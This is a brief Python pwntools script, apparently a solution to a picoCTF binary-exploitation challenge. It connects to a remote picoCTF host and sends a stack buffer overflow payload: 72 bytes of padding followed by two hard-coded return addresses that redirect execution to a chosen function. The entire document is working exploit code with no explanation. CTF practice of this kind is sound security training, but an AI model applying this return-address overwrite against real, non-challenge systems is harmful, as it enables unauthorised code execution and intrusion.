from pwn import *

#p=process("./vuln")
p=remote("saturn.picoctf.net",63125)
payload = b"a"*72
payload += p64(0x00000000004012d1)
payload += p64(0x0000000000401236)
#payload += p64(0x0)

p.sendline(payload)
print(p.recvall().decode())
p.close()

